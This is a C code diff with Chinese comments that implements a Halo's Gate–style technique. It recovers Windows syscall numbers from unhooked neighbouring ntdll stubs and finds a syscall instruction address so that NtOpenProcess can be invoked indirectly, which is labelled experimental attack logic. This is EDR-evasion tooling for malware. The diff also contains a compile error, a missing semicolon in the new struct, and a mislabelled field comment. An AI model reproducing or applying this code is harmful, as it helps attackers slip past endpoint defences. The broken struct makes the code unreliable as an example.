@@ -89,6 +89,13 @@ typedef struct _API_ENTRY{
     PVOID Address;
 } API_ENTRY, *PAPI_ENTRY;
 
+//定义GetHaloEntry的输出结果，包含SSN以及有效syscall的地址
+typedef struct _HALO_ENTRY {
+    DWORD SSN;              // 系统调用号
+    PVOID SyscallAddress;  
+    PVOID FunctionAddress // 蹦床地址 (syscall instruction address)
+} HALO_ENTRY, *PHALO_ENTRY;
+
 // 全局军火库 (放在 .data 段)
 // 这样做的好处是不用 malloc，且位置固定
 API_ENTRY ApiTable[MAX_API_COUNT];
@@ -104,27 +111,46 @@ BOOL IsClean(BYTE* address){
         return TRUE;
     }
 }
-DWORD GetSSN(PVOID FunctionAddress){
+//定义一个辅助函数来提取有效的syscall地址
+PVOID Syscaller_finder(BYTE* address){
+
+    for(int i=1; i<=32; i++){
+        if(address[i] == 0x0F && address[i+1] == 0x05 && address[i+2] == 0xC3){
+            return (PVOID)(address+i);
+        }
+    }
+    printf("[-] no syscall mode found...");
+    return NULL;
+}
+
+DWORD GetHaloEntry(PVOID FunctionAddress, PHALO_ENTRY pEntry){
     BYTE* pByte = (BYTE*)FunctionAddress;
 
     //先检查自己是否纯净
     if(IsClean(pByte)){
-        return ((pByte[5] << 8) | pByte[4]); // 利用小端序（Little Endian）逻辑，将内存中的高位字节左移并与低位字节合并，重组还原出完整的 16 位系统调用号 (SSN)。 
+        pEntry->SSN = ((pByte[5] << 8) | pByte[4]); // 利用小端序（Little Endian）逻辑，将内存中的高位字节左移并与低位字节合并，重组还原出完整的 16 位系统调用号 (SSN)。 
+        pEntry->SyscallAddress = Syscaller_finder(pByte);
+        if(pEntry->SyscallAddress != NULL) return TRUE;
     }
+
     //双向搜索逻辑，最大搜索数设置为前后各32
     for(int i=1; i<=32; i++){
         //向后搜索
         BYTE* pDown = pByte + (i*32);
         if(IsClean(pDown)){
-            return (((pDown[5] << 8) | pDown[4]) - i);
+            pEntry->SSN = (((pDown[5] << 8) | pDown[4]) - i);
+            pEntry->SyscallAddress = Syscaller_finder(pDown);
+            if(pEntry->SyscallAddress != NULL) return TRUE;
         }
         //向前搜索
         BYTE* pUp = pByte - (i*32);
         if(IsClean(pUp)){
-            return (((pUp[5] << 8) | pUp[4]) + i);
+            pEntry->SSN = (((pUp[5] << 8) | pUp[4]) + i);
+            pEntry->SyscallAddress = Syscaller_finder(pUp);
+            if(pEntry->SyscallAddress != NULL) return TRUE;
         }
     }
-    return -1; //啥也没有
+    return FALSE; //啥也没有
 }
 
 //核心，手动解析导出表，查找函数地址
@@ -187,6 +213,7 @@ PVOID GetApi(DWORD TargetHash){
 //引入我们写的汇编函数
 // 这是一个通用的函数指针定义，为了让编译器知道 RunSyscall 可以接受一堆参数
 extern void SetSSN(DWORD ssn);
+extern void SetSyscallAddr(PVOID SyscallAddr);
 extern NTSTATUS RunSyscall(
     PHANDLE ProcessHandle, 
     ACCESS_MASK DesiredAccess, 
@@ -245,14 +272,15 @@ int main(){
                 if (pNtOpenProcess){
                     printf("[!!!] NtOpenProcess Found : 0x%p\n", pNtOpenProcess);
                     //!!!提取SSN
-                    DWORD ssn = GetSSN(pNtOpenProcess);
-                    if(ssn != -1){
-                        printf("[!!!] SSN Extracted: 0x%x (Decimal: %d)\n", ssn, ssn);
-
+                    HALO_ENTRY entry;
+                    if(GetHaloEntry(pNtOpenProcess, &entry)){
+                        printf("[!!!] SSN Extracted: 0x%x (Decimal: %d)\nSyscallAddress: 0x%p\n", entry.SSN, entry.SSN, entry.SyscallAddress);
                         //!!!加入一个试验性的攻击逻辑
                         printf("[*] Preparing to invoke syscall...\n");
                         //将ssn装填进汇编层
-                        SetSSN(ssn);
+                        SetSSN(entry.SSN);
+                        //装填syscall
+                        SetSyscallAddr(entry.SyscallAddress);
                         //准备参数
                         HANDLE hProcess = NULL;
                         OBJECT_ATTRIBUTES oa;
